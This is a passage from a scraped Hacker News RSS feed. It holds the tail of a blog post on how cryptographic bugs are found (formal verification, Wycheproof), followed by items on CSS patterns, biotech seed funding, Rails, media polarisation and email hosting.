<p>We have presented practical forgery and decryption attacks against OCB2, a high-profile ISO-standard authenticated encryption scheme. This was possible due to the discrepancy between the proof of OCB2 and the actual construction, in particular the interpretation of OCB2 as a mode of a TBC which combines XEX and XE.</p>
</blockquote>
<blockquote>
<p>We comment that, due to errors in proofs, ‘provably-secure schemes’ sometimes still can be broken, or schemes remain secure but nevertheless the proofs need to be fixed. Even if we limit our focus to AE, we have many examples for this, such as NSA’s Dual CTR [37,11], EAX-prime [28], GCM [22], and some of the CAESAR submissions [30,10,40]. We believe our work emphasizes the need for quality of security proofs, and their active verification.</p>
</blockquote>
<p>Now, reading and verifying a proof is always a good idea, but it’s slow, it’s not flexible (if you change the protocol, good job changing the proof), and it’s limited (you might want to prove different things re-using parts of the proofs, which is not straight forward).
Today, we are starting to bridge the gap between pen and paper proofs and computer science: it is called formal verification.
And indeed, formal verification is booming, with a number of papers in the recent years finding issues here and there just by describing protocols in a formal language and verifying that they withstand different types of attacks.</p>
<p><a href="https://eprint.iacr.org/2019/526">Prime, Order Please! Revisiting Small Subgroup and Invalid Curve Attacks on Protocols using Diffie-Hellman</a>:</p>
<blockquote>
<p>We implement our improved models in the Tamarin prover. We find a new attack on the Secure Scuttlebutt Gossip protocol, independently discover a recent attack on Tendermint’s secure handshake, and evaluate the effectiveness of the proposed mitigations for recent Bluetooth attacks.</p>
</blockquote>
<p><a href="https://eprint.iacr.org/2019/779">Seems Legit: Automated Analysis of Subtle Attacks on Protocols that Use Signatures</a>:</p>
<blockquote>
<p>We implement our models in the Tamarin Prover, yielding the first way to perform these analyses automatically, and validate them on several case studies. In the process, we find new attacks on DRKey and SOAP’s WS-Security, both protocols which were previously proven secure in traditional symbolic models.</p>
</blockquote>
<p><img alt="tamarin" src="https://cryptologie.net/upload/tamarin-obseq-lemma-attack.jpg"></p>
<p>But even this kind of techniques has limitation! (OMG David when will you stop?)</p>
<p>In 2017 <a href="https://blog.cryptographyengineering.com/2017/10/16/falling-through-the-kracks/">Matthew Green wrote</a>: </p>
<blockquote>
<p>I don’t want to spend much time talking about KRACK itself, because the vulnerability is pretty straightforward. Instead, I want to talk about&nbsp;why&nbsp;this vulnerability continues to exist so many years after WPA was standardized. And separately, to answer a question: how did this attack slip through, despite the fact that the 802.11i handshake was&nbsp;formally proven secure?</p>
</blockquote>
<p>He later writes:</p>
<blockquote>
<p>The critical problem is that while people looked closely at the two components — handshake and encryption protocol —&nbsp;in isolation, apparently nobody looked closely at the two components as they were connected together. I’m pretty sure there’s an entire&nbsp;geek meme&nbsp;about this.</p>
</blockquote>
<p>pointing to the "2 unit tests. 0 integration tests." joke.</p>
<p><img alt="meme" src="https://cryptologie.net/upload/ezgif-3-a0aa048a0c79.gif"></p>
<p>He then recognizes that it’s a hard problem:</p>
<blockquote>
<p>Of course, the reason nobody looked closely at this stuff is that doing so is just&nbsp;plain&nbsp;hard. Protocols have an exponential number of possible cases to analyze, and we’re just about at the limit of the complexity of protocols that human beings can truly reason about, or that peer-reviewers can verify. The more pieces you add to the mix, the worse this problem gets.
In the end we all know that the answer is for humans to stop doing this work. We need machine-assisted verification of protocols, preferably tied to the&nbsp;actual source code that implements them. This would ensure that the protocol actually does what it says, and that implementers don’t further screw it up, thus invalidating the security proof.</p>
</blockquote>
<p>Well, Matthew, we do have formally generated code! <a href="https://hacl-star.github.io/">HACL*</a> and <a href="http://adam.chlipala.net/papers/FiatCryptoSP19/FiatCryptoSP19.pdf">fiat-crypto</a> are two examples.
Anybody has heard of that failing? I’d be interested…</p>
<p>In any case, what’s left for us? A lot! Formally generated code is hard, and generally covers small parts of your protocol (e.g. field arithmetic for elliptic curves).
So what else can we do?
Implementing the protocol, if it hasn’t been implemented before, is a no-brainer.
In 2016, Taylor Hornby an engineer at Zcash <a href="https://electriccoin.co/blog/fixing-zcash-vulns/">wrote about a bug he found</a> while implementing the zerocash paper into the Zcash cryptocurrency:</p>
<blockquote>
<p>In this blog post, we report on the security issues we’ve found in the Zcash protocol while preparing to deploy it as an open, permissionless financial system.
Had we launched Zcash without finding and fixing the InternalH Collision vulnerability, it could have been exploited to counterfeit currency. Someone with enough computing power to find 128-bit hash collisions would have been able to double-spend money to themselves, creating Zcash out of thin air.</p>
</blockquote>
<p>Perhaps re-implementing the protocol in a different language might work as well?</p>
<p><img alt="" src="https://cryptologie.net/upload/Screen_Shot_2020-11-23_at_10.16_.18_PM_.png"></p>
<p>One last thing, most of the code out there is not formally verified.
So of course, reviewing code works, but you need time, expertise, money, etc.
So instead, what about testing?
This is what <a href="https://github.com/google/wycheproof">Wycheproof</a> does by implementing a number of test vectors that are known to cause issues:</p>
<blockquote>
<p>These observations have prompted us to develop Project Wycheproof, a collection of unit tests that detect known weaknesses or check for expected behaviors of some cryptographic algorithm. Project Wycheproof provides tests for most cryptographic algorithms, including RSA, elliptic curve crypto and authenticated encryption. Our cryptographers have systematically surveyed the literature and implemented most known attacks. We have over 80 test cases which have uncovered more than&nbsp;40 bugs. For example, we found that we could recover the private key of widely-used DSA and ECDHC implementations.</p>
</blockquote>
<p>In all of that, I didn't even talk about the benefits of writing a specification... that's for another day.</p>
</article><p>Well done! You've reached the end of my post. Now you can <a href="">leave a comment</a> or read something else.</p></div>]]>
            </description>
            <link>https://cryptologie.net/article/511/how-do-people-find-bugs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25200893</guid>
            <pubDate>Tue, 24 Nov 2020 17:49:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A simple tool to create beautiful CSS backgrounds]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25200839">thread link</a>) | @parisianka
<br/>
November 24, 2020 | https://www.magicpattern.design/tools/css-backgrounds | <a href="https://web.archive.org/web/*/https://www.magicpattern.design/tools/css-backgrounds">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><nav><div><div><p><a href="https://www.magicpattern.design/features">Features</a></p><p><a href="https://www.magicpattern.design/examples">Examples</a></p><p><a href="https://www.magicpattern.design/tools">Tools</a></p><p><a href="https://www.magicpattern.design/blog">Blog</a></p><p><a href="https://www.magicpattern.design/pricing">Pricing</a></p></div></div><div></div></nav><div><h2>Beautiful pure CSS background patterns that you can actually use in your projects! <br>Created by<!-- --> <b><a target="_blank" rel="noreferrer" href="https://www.twitter.com/d__raptis">@d__raptis</a></b></h2></div><p><a type="button" href="https://www.producthunt.com/posts/css-background-patterns?utm_source=badge-featured&amp;utm_medium=badge&amp;utm_souce=badge-css-background-patterns" target="_blank"><img src="https://api.producthunt.com/widgets/embed-image/v1/top-post-badge.svg?post_id=271102&amp;theme=dark&amp;period=daily" alt="CSS Background Patterns - FREE editable patterns that actually look cool | Product Hunt" width="250" height="54"></a></p><div></div><div><div><div><div><div></div><p>Back Color<!-- -->:</p></div><div role="group"></div></div><div><div><div></div><p>Front Color<!-- -->:</p></div><div role="group"></div></div><div><div><div></div><p>Opacity<!-- -->:</p></div><div role="presentation" tabindex="-1"></div></div><div><div><div></div><p>Spacing<!-- -->:</p></div><div role="presentation" tabindex="-1"></div></div></div><div><div><div><p>Wavy</p><div><div></div><div></div></div></div></div><div><div><p>Rhombus</p><div><div></div><div></div></div></div></div><div><div><p>ZigZag</p><div><div></div><div></div></div></div></div><div><div><p>ZigZag 3D</p><div><div></div><div></div></div></div></div><div><div><p>Moon</p><div><div></div><div></div></div></div></div><div><div><p>Circles</p><div><div></div><div></div></div></div></div><div><div><p>Diagonal</p><div><div></div><div></div></div></div></div><div><div><p>Diagonal v2</p><div><div></div><div></div></div></div></div><div><div><p>Paper</p><div><div></div><div></div></div></div></div><div><div><p>Isometric</p><div><div></div><div></div></div></div></div><div><div><p>Polka</p><div><div></div><div></div></div></div></div><div><div><p>Polka v2</p><div><div></div><div></div></div></div></div><div><div><p>Lines</p><div><div></div><div></div></div></div></div><div><div><p>Lines v2</p><div><div></div><div></div></div></div></div><div><div><p>Diagonal v3</p><div><div></div><div></div></div></div></div><div><div><p>Boxes</p><div><div></div><div></div></div></div></div><div><div><p>Lines v3</p><div><div></div><div></div></div></div></div><div><div><p>Lines v4</p><div><div></div><div></div></div></div></div><div><div><p>Triangle</p><div><div></div><div></div></div></div></div><div><div><p>Triangle v2</p><div><div></div><div></div></div></div></div><div><div><p>Rectangles</p><div><div></div><div></div></div></div></div><div><div><p>Cross</p><div><div></div><div></div></div></div></div></div></div><div><p><a type="button" href="mailto:jim@magicpattern.design">Submit your own CSS pattern</a></p></div><div><div><div><div><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500"><path d="M249.893 400C194.606 400 149.787 444.771 149.787 500L350 500C350 444.771 305.181 400 249.893 400Z" fill="#6282E3"></path><path d="M249.893 300C194.606 300 149.787 344.772 149.787 400L350 400C350 344.772 305.181 300 249.893 300Z" fill="#6282E3"></path><circle cx="250" cy="100" r="100" fill="#4252EE"></circle><rect x="50" y="300" width="100" height="400" transform="rotate(-90 50 300)" fill="white"></rect></svg><div><h2>Create unlimited patterns in seconds. <br>Try it now, it's so easy.</h2><p>The easiest way to brand your business uniquely</p></div></div></div></div></div></div></div>]]>
            </description>
            <link>https://www.magicpattern.design/tools/css-backgrounds</link>
            <guid isPermaLink="false">hacker-news-small-sites-25200839</guid>
            <pubDate>Tue, 24 Nov 2020 17:45:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The new generation of biotech seed funds]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25200836">thread link</a>) | @aaavl2821
<br/>
November 24, 2020 | https://www.baybridgebio.com/blog/top-seed-funds.html | <a href="https://web.archive.org/web/*/https://www.baybridgebio.com/blog/top-seed-funds.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        
	<p>by Jonathan Algoo and Richard Murphey</p>
	
        <p>This post will cover:</p>
          <ul>
            <li>A list of good seed-stage biotech investors</li>
            <li>A list of helpful resources on how to raise seed funding</li>
            <li>A discussion of the different types of investors funding seed-stage biotech companies</li>
            <li>An overview of the fundraising process</li>
            <li>Some alternative ways of funding your company</li>
          </ul>
	<p>Until very recently, biotech venture capital was only available to seasoned big pharma executives with extensive networks.  If you were a young scientific founder, raising your initial capital was very difficult.</p>
	<p>But that has changed.  In the last few years, dozens of new funds have emerged specifically to invest in young scientific founders.  These new investors are embracing founders that have traditionally been overlooked by the biotech VC community.</p>
	<p>If you are a young scientific entrepreneur, there has never been a better time to start a company.  But that doesn't mean it is easy.  This post will provide some resources to help first-time scientific founders understand the fundraising process.</p>
	<br>	
	<h3>The top biotech seed investors</h3>
	
	<p>To create this list, I asked biotech founders in my network which investors they would recommend.  I only asked founders who had raised $1M or more in seed capital in the last two years.  Thus every investor on this list (as of Q4 2020) is 1) actively investing and 2) is founder-friendly.</p>
	<p>The downside of this methodology is that this list is not comprehensive.  Because it is limited to founders I know, this list certainly omits great investors.  If you are a founder and think an investor should be added, <a href="https://goo.gl/forms/kHRFwxfXidRVZsDf1">let me know</a>.</p>
        <p>If you are interested in getting feedback on your pitch or learning more about investors and fundraising, we're experimenting with a few programs to help: 1) office hours and pitch feedback from founders who've recently raised seed capital and 2) "founder support groups" where 4-6 founders get together each month or so to help each other out.  If you're interested in participating, let us know <a href="https://forms.gle/gVawWFEukbDoQTPW9">here</a>.</p>
        <p>On to the investor list (thanks to Jonathan Algoo for pulling some of this info):</p>
	</div>
    </div><section>
    <div>
      <div>
	
	
	<p>There are a number of great guides on seed fundraising on the internet.  These guides are mostly written for software startups, but because many of the new generation of seed investors come from the Silicon Valley startup world, many of the lessons apply to biotech companies raising seed capital.  This post will provide some additional information that is specific to biotech.</p>
        <p>If you are raising seed money for the first time, these are a few of the excellent resources you should read:</p>
	<ul>
	  <li><a href="http://paulgraham.com/fr.html">How to raise money</a> by Paul Graham, cofounder of Y Combinator</li>
	  <li><a href="https://lifescivc.com/2013/09/ten-tips-for-raising-startup-capital-in-biotech/">Ten Tips for Raising Startup Capital in Biotech</a> by Bruce Booth, Partner at Atlas Venture</li>
	  <li><a href="https://youtu.be/LR6YQy-p3hU">How to pitch to biotech VCs: two 'mock pitches' and VC panel discussion</a> (video)</li>
	  <li><a href="http://paulgraham.com/convince.html">How to convince investors</a> by Paul Graham</li>
	  <li><a href="https://www.michaelseibel.com/blog/how-to-pitch-your-company">How to pitch your company</a> by Michael Seibel, President of Y Combinator</li>
	  <li><a href="https://lifescivc.com/2017/03/abundance-scarcity-venture-capital/">Of abundance and scarcity in venture capital</a> by Bruce Booth</li>
	  <li><a href="https://lifescivc.com/2016/05/tale-two-startup-worlds-biotech-tech-vc-ecosystems/">A tale of two startup worlds: biotech and tech VC ecosystems</a> by Bruce Booth</li>
	  <li><a href="https://youtu.be/0pXDNuRJTm4">How 5 young founders started and funded their biotech companies</a> (video)</li>
	  <li><a href="https://www.ycombinator.com/library/4A-a-guide-to-seed-fundraising">A guide to seed fundraising</a> by Geoff Ralston, president of Y Combinator</li>
	  <li><a href="https://www.ycombinator.com/library/3N-process-and-leverage-in-fundraising">Process and leverage in fundraising</a> by Aaron Harris, parter at Y Combinator</li>
	  <li><a href="https://techventures.columbia.edu/news-and-events/videos/venture-capital-perspectives-early-stage-biotech-investing-doug-cole-flagship">Early stage biotech investing</a> with Doug Cole, Flagship Pioneering</li>
	  <li><a href="https://www.ycombinator.com/library/2u-how-to-build-your-seed-round-pitch-deck">How to build your seed round pitch deck</a> by Aaron Harris</li>
	  <li>Venture Deals <a href="https://www.amazon.com/Venture-Deals-Smarter-Lawyer-Capitalist-dp-1119594820/dp/1119594820/ref=dp_ob_title_bk">book</a> and <a href="https://www.techstars.com/newsroom/learn-how-to-do-venture-deals-from-the-experts-free-7-week-class">free class</a> by Brad Feld and Jason Mendelson</li>
	  <li><a href="http://paulgraham.com/fundraising.html">A fundraising survival guide</a> by Paul Graham</li>
	  <li><a href="https://www.baybridgebio.com/blog/vc_basics_2.html">Mechanics of venture capital</a> by me</li>
	  <li><a href="https://a16z.com/2016/09/11/vc-economics/">16 definitions on the economics of VC</a> by Scott Kupor, Andreessen Horowitz</li>
	</ul>
	<p>Many of the above resources are created by people from the tech software world, and some are from traditional biotech investors.  There are many differences between these two broad categories of investors, some of them very deep.  A unique challenge of raising capital in biotech is navigating these differences.</p>
        <br>
        <h3>Differences between "tech-bio" and "biotech" investors</h3>
        
        <p>Many of the biotech investors who come from the software world refer to themselves as "tech-bio" or "bio" investors.  From ~2000 until a few years ago, "biotech" was a dirty word in the Silicon Valley software world – most big tech VCs specifically avoided biotech.  Recently, many of these tech VCs have started active biotech investing practices, and they've created new terminology to describe the space.  I’ll use "tech-bio" or "bio" to refer to investors coming to biotech from the software world, and "biotech" to refer to investors who have always specialized in biotech.  When I say "biotech" to refer to a topic other than investors, I'm just referring to the industry as a whole.</p>
        <p>One of the major differences between these categories of investor is that tech-bio investors are much more active and founder-friendly at the seed stage, so they are your best bet for raising initial capital.  However, tech-bio investors are <a href="https://www.baybridgebio.com/blog/top_vcs_2018.html">not as active</a> at the Series A stage as biotech VCs (with the exception of a few firms like a16z and DCVC).  So you will likely need to raise your Series A from traditional biotech investors, or a mix of biotech and tech-bio investors.</p>
        <p>The transition from tech-bio VC-funded seed stage company to biotech VC-funded Series A stage company can be difficult.  You may get conflicting advice from seed and Series A investors.  Biotech VCs may expect very different things than tech-bio VCs during a fundraising process, including much more scientific diligence and a different kind of pitch.  Biotech VCs may want a much lower valuation than you were expecting.  They may want to replace or supplement the senior management team, or have input into the scientific direction of your company (often focusing more on products than the platform).  They may take a more active role in your future fundraising and BD strategy.</p>
        <p>There are several tech-bio VCs that are active at the seed stage and have great relationships with Series A biotech VCs, or that lead Series A rounds themselves.  Raising from them can ease the seed-to-Series A transition (though there are downsides as well).  Getting feedback from Series A investors during your seed process (even if you don't expect to raise from them) can also help you figure out what kind of company to build that will attract Series A investors.</p>
        <p>While raising a Series A round can be tough now, the capital markets are evolving very quickly, and in a year or two, there may be many more VCs active in the Series A market.  There is a large wave of companies that raised seed rounds in the last few years that are starting their Series A process.  Many of them are high-quality companies with great teams that are finding a shortage of investors who support their vision.  Series A investors who combine the scientific rigor and expertise of biotech VCs with the ambition of tech VCs will find many quality companies eager to partner with them.</p>
	<br>	
	<h3>Types of investors</h3>
	
	<p>From the 2000s until a few years ago, the tech and biotech startup worlds have been largely independent.  Few investors funded both tech and biotech companies.  That has changed significantly in the last few years.  Below are some common types of investment firms that you may come across:</p>
	<p><b>“Traditional” early-stage biotech VCs</b>: These investors are large, established venture funds that primarily invest in Series A or later rounds, and primarily fund therapeutics companies.  They also do seed investing and venture creation as a way to feed their Series A investing practice, but they make their money on Series A and later-stage investments, not seed investments.  For many years, these were the only investors that regularly invested in seed-stage biotech companies, even though seed investing was an ancillary focus for them.</p>
	<p>These funds are highly specialized and experienced.  They have the most domain expertise, best track records and deepest scientific and industry networks of all early-stage biotech investors.  These firms are generally staffed with PhDs or MDs who understand science and have deep experience in the industry.</p>
	<p><i>Examples</i>: 5AM Ventures, Atlas Venture, ARCH Venture Partners, Flagship, The Column Group, Versant, MPM Capital, Third Rock Ventures, Polaris Partners</p>
	<p><b>Tech-bio VCs</b>: These are the software counterparts of the traditional biotech VCs -- the blue-chip venture funds – that have decided to invest in biotech in addition to tech / software.  Like their biotech counterparts, they make their money on Series A investments, but use seed investing to support their Series A and later-stage venture business.  These funds often got into biotech by doing seed investments to test the biotech waters, but many are becoming very active at the Series A stage.  Some of these funds have dedicated investment vehicles for biotech (like a16z and DCVC), some invest in biotech from their main software / tech fund, and some have dedicated funds for seed investing while others invest from the same fund for Series A and seed.  Most of these firms started out as software investors, but others (like Lux and DCVC) have traditionally invested in “hard tech” (robotics, AI, energy, etc – anything that isn't a mobile or web app), of which biotech is a subset.</p>
	<p>These funds have a different approach to investing than biotech VCs.  They tend to do diligence more quickly than biotech funds, offer more founder-friendly terms, and focus more on marketing to attract deal flow, win deals, and raise money from LPs (this is why so many tech VCs blog and tweet, while very few biotech VCs blog).  They also tend to be more open to investing in younger technical founders than biotech VCs.</p>
	<p><i>Examples</i>: a16z, DCVC, Lux Capital, 8VC</p>
	<p><b>“Tech-bio” seed funds</b>:  These funds are typically started and managed by people from the “tech” startup world, but differ from “tech-bio VCs” in that they make their money on seed …</p></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.baybridgebio.com/blog/top-seed-funds.html">https://www.baybridgebio.com/blog/top-seed-funds.html</a></em></p>]]>
            </description>
            <link>https://www.baybridgebio.com/blog/top-seed-funds.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25200836</guid>
            <pubDate>Tue, 24 Nov 2020 17:44:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ruby on Rails: Still the Best Web App Framework for Most Teams]]>
            </title>
            <description>
<![CDATA[
Score 57 | Comments 27 (<a href="https://news.ycombinator.com/item?id=25200799">thread link</a>) | @sairamkunala
<br/>
November 24, 2020 | https://naildrivin5.com/blog/2020/11/23/rails-is-the-best-choice-for-most-teams.html | <a href="https://web.archive.org/web/*/https://naildrivin5.com/blog/2020/11/23/rails-is-the-best-choice-for-most-teams.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <p>Earlier this year, I was in the position to choose the framework for the startup at which I’m now the CTO. I
could’ve chosen anything. I went with Rails.  And you should, too. It still is the best framework for getting up
and running <em>and</em> for continued iteration and development.</p>

<!-- more -->

<p>Writing a web app requires many moving pieces.  If you use something like Spring, Node, Express, or any other basic
library, you have a <em>lot</em> of decisions to make:</p>

<ul>
  <li>How are URLs routed to code?</li>
  <li>How are headers, params, and request bodies parsed?</li>
  <li>Where does the code live to manage this?</li>
  <li>How are responses created?</li>
  <li>How do we generate dynamic HTML?</li>
  <li>How do we mitigate against common security vulnerabilities such as cross-site scripting?</li>
</ul>

<p>Of course, web apps almost always have a database, which leads to more decisions:</p>

<ul>
  <li>How will we access the database?</li>
  <li>How is the database schema managed?</li>
  <li>What conventions will we use for table and column names?</li>
</ul>

<p>Then, there are concerns around the development environment:</p>

<ul>
  <li>How do we write tests?</li>
  <li>How can we execute a test using a web browser?</li>
  <li>How do we manage the data needed for our tests?</li>
  <li>How do we manage data needed to run the app locally?</li>
</ul>

<p>Finally, there are concerns around deployment and production:</p>

<ul>
  <li>How do I get JavaScript packaged for the browser?</li>
  <li>How do I manage CSS?</li>
  <li>How do I create cacheable bundles for CDNs?</li>
</ul>

<h2 id="the-cost-of-making-so-many-decisions">The Cost of Making So Many Decisions</h2>

<p>These decisions are only the beginning.  I’ve worked on web apps that used libraries only—no frameworks—and all of
these decisions plus more had to be made. Many had to be made before the team could start working.  But as time
went by and the team’s composition changed, managing these decisions was a constant tax.</p>

<p>…managing these decisions was a constant tax</p>

<p>Because <em>we</em> made these decisions and <em>we</em> configured our libraries to work in a particular way, it was not
uncommon for developers to want to know why we did it that way, and could we change it?  Many of these decisions
amount to conventions not enforceable with code, so a good chunk of our code reviews required making sure everyone
followed the conventions.</p>

<p>And then we would update our libraries to find out they were suddenly incompatible.  Because we’d hand-selected
libraries to solve each problem, we had no way to guarantee they all worked together other than making sure our app
still worked.  It was hard to see the value in the series of decisions that led to this architecture.</p>

<h2 id="stop-making-so-many-decisions">Stop Making So Many Decisions</h2>

<p>With Rails, you don’t have to make <em>any</em> of the decisions above. None.  Once you type <code>rails new</code> all of those
decisions are made.  True, there are more decisions you will have to make, but Rails will have eliminated a huge number of ultimately pointless decisions.</p>

<p>Rails will have eliminated a huge number of ultimately pointless decisions</p>

<p>It simply doesn’t matter how JavaScript is packaged, what your database naming conventions are, or how HTTP requests are routed to code. You need answers and conventions for all of that, yes, but the actual conventions don’t matter.</p>

<p>What you also need are the conventions to be enforced or managed in code, not documentation. That way, everyone is
incentivized to focus on the problems specific to their domain instead of the plumbing of their app.</p>



<p>This has been the value proposition for Rails since its inception over 15 year ago.  In that time, Rails and its
ecosystem have matured, improved, and continued moving forward.  The value Rails brings is still needed, and it is
<em>still</em> the best framework for most teams.</p>

<p>Engineers without Rails experience may continue to believe the fantasy that Rails does not scale or that it can’t
be used for “serious” problems.  Those of us <em>with</em> Rails experience know this isn’t true.  But what we also worry
about is that Rails apps can become unmaintainable.</p>

<h2 id="rails-helps-maintainability">Rails Helps Maintainability</h2>

<p>Hopefully, it’s obvious that no framework or set of libraries can ensure maintainability.  I would argue that Rails
gives you a better chance.  Rails—and its ecosystem—tend to evolve together, so you can rely on the stability of
your core tools over many years.</p>

<p>Rails basis in conventions also means that there are generally fewer parts of an app to get crufty as time goes by.
But, it’s still up to the team to establish conventions and ways of working to capitalize on that.  As it would be
on any team.</p>

<p>So what happens when the team stops making pointless decisions, worrying about library compatibility, and spending
code-review time on conventions?  They start thinking about the problems they need to solve. That’s why Rails is
the best web framework for most teams.</p>

  </section></div>]]>
            </description>
            <link>https://naildrivin5.com/blog/2020/11/23/rails-is-the-best-choice-for-most-teams.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25200799</guid>
            <pubDate>Tue, 24 Nov 2020 17:40:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[No surprises here – On the absence of information in today’s media]]>
            </title>
            <description>
<![CDATA[
Score 116 | Comments 78 (<a href="https://news.ycombinator.com/item?id=25200732">thread link</a>) | @s3v
<br/>
November 24, 2020 | https://www.turningchaos.com/essays/no-surprises-here | <a href="https://web.archive.org/web/*/https://www.turningchaos.com/essays/no-surprises-here">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-4a3121594376e73eb592"><div><h2>The absence of information in today’s press</h2><p>"<em>Nobody goes to a newspaper for news.</em>" —Martin Gurri</p><p>We're told we live in the information age. Statements like this often quote the mind-boggling amount of data produced on the internet using exotic-sounding words like zettabytes per day as proof. To function in this sea of data, we're supposed to find signals in the noise and read from credible sources of news and other information. With news media taking political stances, it's not that easy.</p><p>My assertion, paradoxically, is that polarization has greatly diminished the <em>quantity of information</em> being produced and consumed via today's press despite the sea of content they produce. The result is a loss of the press's effectiveness in their two functions within a healthy democracy, as a check on government and promoter of informed debate.</p><h2>Information</h2><p>It's important to define terms. What is information?</p><p>In the <a href="https://en.wikipedia.org/wiki/Information_theory">information theory</a> definition, the quantity of information in a message is related to the amount of <em>surprise</em> it contains. This idea of surprise is key so I'm going to spend some time on it.</p><p>Let's imagine you're receiving messages about some set of data and you're trying to determine its distribution. Each message contains one data point. Early on, as you receive messages, the information provided by each piece of data is high because you know very little about the data itself. With each new piece of information, you start to construct a representation of the overall data set like the one shown in the image below.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1606176449103_6575"><div><p>After some number of points, you realize the data is a normal distribution or bell-curve and you can make some determination about its structure. In this case, the mean or average value as well as its width (or standard deviation). Let's say the average value is 0 and the standard deviation is 1. This means that 68% of the values will be between -1 and 1, 95% will be between -2 and 2, and &gt;99% will be between -3 and 3.</p><p>Great! Let's say the next set of messages that you get are 0, 0.1, and 1. Those numbers are completely within the expected range we calculated earlier. There's nothing particularly surprising about them, and as a result, <strong>there is almost no information</strong> contained within them.</p><p>What if you get a message of 10? Now there's a problem. There's almost no chance that the distribution we described above should include a value of 10. Getting 10 is very surprising. So surprising that it may mean the model we had for this data is entirely wrong. That's a lot of information contained in one message of 10, way more than the other messages we got earlier.</p><p>Why does 10 have so much information? It's because it's surprising. It causes us to challenge the model we had built. It could be that the message was a mistake, a fluke. But it could also be that the conclusions we held were wrong. <strong>The more high-information messages like this we get, the more we should start to challenge the beliefs we previously held.</strong> Now let's get back to media.</p><h2>News media</h2><p>In today's polarized media, each side of the media discourse has established its perspective, and the content they publish conforms to this perspective. When you go to a news outlet with a particular leaning, you may not know exactly what stories they'll be writing about, but you do know what <em>kind</em> of stories will be covered and from what perspective. Your knowledge about that outlet's outlook was built up over time as you encountered what they publish.</p><p>When one outlet consistently publishes pieces that align with their perspective, the information content provided by each article starts to diminish. When the theme of each article aligns within the expected distribution, there's no surprise and thus no information.</p><p>It's important to take a moment to distinguish surprise from shock. As you may be familiar, it's common for media to publish stories that have a shock value as they compete with other organizations for your attention. What I'm discussing in this essay isn't the shock value or the particular event that the news media is writing about, it's the perspective of the news organization and the degree of surprise that they published it. For example, you might be shocked at the behavior of one political party's behavior, but are you surprised by it, and more importantly, are you surprised that a news organization that takes the opposite position is publishing a story about it? Shock and surprise can be related, but there's a distinction here between headlines that are attention-grabbing and whether the content fits the mold of the news organization's narrative.</p><h2>Implications</h2><p>The danger of this is two-fold. First, if you only read from one source or a set of sources with similar outlooks, the media source's perspective can start to become yours. You end up with a world-view that aligns with the publisher's view. Since that source never prints anything which disputes that view, your perspective on the world becomes insulated and unchallenged. It's like the example above where we thought we knew the distribution was a bell-curve until we got a few message outliers. Those outliers demanded we reconsider our earlier conclusions. Except this time, <strong>the outliers exist but we never receive them</strong>. We go about our days oblivious to information that would challenge our world-view because it doesn't get published anywhere we look.</p><p>"<em>A free press is one of the pillars of democracy</em>." - Nelson Mandela</p><p>The second danger involves the media's role as a check on government. The branches of government exist to prevent the abuse of power by one another. <strong>The press exists to prevent the abuse of information by the government.</strong> It should question and investigate claims by the government to inform voters and further civic discourse.</p><p>However, this function requires the press to be viewed as impartial, truth-seeking, and without advancing an opinion except where explicitly noted (i.e. the opinion section). If the average voter comes to distrust the press, this function is lost. Articles that would normally inform the voter, providing surprise and evidence that would counter a particular world-view, instead go unread or dismissed. Voters either write off the press entirely or read solely from outlets with views that align with their own further solidifying their own beliefs. In either case, we end up with tribes of perspectives unwilling to seek a compromise that can allow the country to proceed collectively.</p><p>I'm not claiming that all reporters are like this. There are excellent reporters that seek truth regardless of politics. Unfortunately, this independent perspective is increasingly difficult to find. Well-reasoned, objective reporting doesn't generate the same attention as partisan emotion.</p><p>Instead, our press needs to promote information and surprise without bias. By only publishing from one narrative, they insulate the public (and themselves!) from information that could lead to honest debate and discovery. Likewise, our opinions should be formed from a careful examination of arguments and evidence on each side of the issue, <strong>reading from only one perspective is akin to not reading at all.</strong></p></div></div></div>]]>
            </description>
            <link>https://www.turningchaos.com/essays/no-surprises-here</link>
            <guid isPermaLink="false">hacker-news-small-sites-25200732</guid>
            <pubDate>Tue, 24 Nov 2020 17:35:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Launching Autocode 1.0]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25200619">thread link</a>) | @tardismechanic
<br/>
November 24, 2020 | https://autocode.com/community/announcements/launching-autocode-1-0/ | <a href="https://web.archive.org/web/*/https://autocode.com/community/announcements/launching-autocode-1-0/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://autocode.com/community/announcements/launching-autocode-1-0/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25200619</guid>
            <pubDate>Tue, 24 Nov 2020 17:25:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Comparison of Email Hosting Possibilities]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25200588">thread link</a>) | @Wronnay
<br/>
November 24, 2020 | https://blog.m5e.de/post/comparison-of-email-hosting-possibilities/ | <a href="https://web.archive.org/web/*/https://blog.m5e.de/post/comparison-of-email-hosting-possibilities/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>
        <p>I’ve hosted my own Mailserver in various configurations since more than 6 years now. Since then I’ve taken multiple breaks from hosting it myself and explored other solutions for hosting emails with your own domain names.</p>
